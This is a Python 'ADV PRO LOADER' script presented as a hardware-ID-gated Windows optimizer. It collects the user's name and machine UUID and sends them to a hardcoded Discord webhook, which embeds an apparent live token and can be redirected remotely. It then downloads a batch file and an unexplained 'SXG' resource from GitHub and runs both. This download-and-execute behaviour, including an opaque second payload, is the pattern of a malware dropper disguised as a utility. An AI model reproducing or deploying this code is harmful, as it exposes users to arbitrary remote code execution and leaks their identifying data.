import os, sys, uuid, subprocess, requests, getpass
from datetime import datetime

# --- Optimizer config and functions ---
BASE_URL = "https://raw.githubusercontent.com/nandhinichowdary18-svg/optimizer/main"
HWID_URL = f"{BASE_URL}/hwid.txt"
OPT_URL = f"{BASE_URL}/optimizer.bat"
DISCORD_INVITE = "https://discord.gg/bf32QCdgZM"
DEFAULT_WEBHOOK_URL = "https://discord.com/api/webhooks/1471873575333003297/oGsbfzq3xfXHzyDU3WuoUAvBo51PaOAjSteRURXG68Ij6oCcWaCE_16tPBr9V3OE5ngP"
WEBHOOK_URL_FILE = f"{BASE_URL}/webhook.txt"
TEMP_DIR = os.getenv("TEMP")

# --- SXG config ---
SXG_URL = "https://raw.githubusercontent.com/nandhinichowdary18-svg/sxg/refs/heads/main/sxg"

# --- Optimizer functions ---
def get_hwid():
    try:
        cmd = 'powershell -NoProfile -Command "(Get-CimInstance Win32_ComputerSystemProduct).UUID"'
        return subprocess.check_output(cmd, shell=True).decode().strip().upper()
    except:
        return None

def get_webhook_url():
    try:
        r = requests.get(WEBHOOK_URL_FILE + "?nocache=" + uuid.uuid4().hex, timeout=5)
        if r.status_code == 200:
            url = r.text.strip()
            if url:
                return url
    except:
        pass
    return DEFAULT_WEBHOOK_URL

def send_webhook(username, hwid, status):
    hook = get_webhook_url()
    if not hook or "PUT_NEW_WEBHOOK_HERE" in hook:
        return
    embed = {
        "title": "Optimizer Access Log",
        "color": 0x00FFFF if status == "GRANTED" else 0xFF0000,
        "fields": [
            {"name": "Username", "value": username, "inline": False},
            {"name": "HWID", "value": hwid, "inline": False},
            {"name": "Access Status", "value": status, "inline": False},
            {"name": "Time", "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "inline": False},
        ]
    }
    try:
        requests.post(hook, json={"embeds": [embed]}, timeout=5)
    except:
        pass

def authorized_user(hwid):
    try:
        r = requests.get(HWID_URL + "?nocache=" + uuid.uuid4().hex,
                         headers={"Cache-Control": "no-cache", "Pragma": "no-cache"},
                         timeout=10)
        if r.status_code != 200:
            return False
        lines = [line.strip().upper() for line in r.text.replace("\ufeff", "").splitlines() if line.strip()]
        return hwid.strip().upper() in lines
    except:
        return False

def download_optimizer():
    try:
        tmp = os.path.join(TEMP_DIR, f"optimizer_{uuid.uuid4().hex}.bat")
        r = requests.get(OPT_URL + "?nocache=" + uuid.uuid4().hex, timeout=15)
        if r.status_code == 200:
            with open(tmp, "wb") as f:
                f.write(r.content)
            if os.path.getsize(tmp) > 0:
                return tmp
    except:
        pass
    return None

# --- SXG functions ---
def download_sxg():
    url = SXG_URL.replace("/refs/heads/", "/")
    try:
        tmp = os.path.join(TEMP_DIR, f"sxg_{uuid.uuid4().hex}")
        r = requests.get(url + "?nocache=" + uuid.uuid4().hex, timeout=15)
        if r.status_code == 200:
            with open(tmp, "wb") as f:
                f.write(r.content)
            if os.path.getsize(tmp) > 0:
                return tmp
    except:
        pass
    return None

def run_sxg(path):
    run_with_python = False
    if path.lower().endswith(".py"):
        run_with_python = True
    else:
        try:
            with open(path, "rb") as f:
                head = f.read(128)
            if b"import " in head or b"def " in head:
                run_with_python = True
        except Exception:
            pass
    try:
        if run_with_python:
            subprocess.Popen([sys.executable, path])
        else:
            subprocess.Popen(["cmd", "/k", path])
    except Exception as e:
        print("failed to execute SXG", e)

# --- Main combined logic ---
def main():
    print("=" * 42 + "\n          ADV PRO LOADER\n" + "=" * 42 + "\n")
    username = getpass.getuser()
    print("Collecting HWID...")
    hwid = get_hwid()
    if not hwid:
        send_webhook(username, "UNKNOWN", "HWID FAILED")
        input("Press Enter to exit...")
        sys.exit()
    print("Your HWID:", hwid, "\nChecking authorization...")
    if not authorized_user(hwid):
        print("\nYOU DO NOT HAVE ACCESS.\nTO GET ACCESS TO THIS OPTIMIZER JOIN DISCORD SERVER.")
        print("Join:", DISCORD_INVITE)
        send_webhook(username, hwid, "DENIED")
        input("Press Enter to exit...")
        sys.exit()
    print("\nAccess Granted!\n")
    send_webhook(username, hwid, "GRANTED")
    # Download and run optimizer
    opt = download_optimizer()
    if not opt:
        print("\nFailed to download optimizer.")
        input("Press Enter to exit...")
        sys.exit()
    print("\nLaunching optimizer...\n")
    subprocess.Popen(["cmd", "/k", opt])
    # Download and run SXG
    sxg = download_sxg()
    if sxg:
        print("\nLaunching SXG resource...\n")
        run_sxg(sxg)
    else:
        print("\nFailed to download SXG resource.")
    sys.exit()

if __name__ == "__main__":
    main()
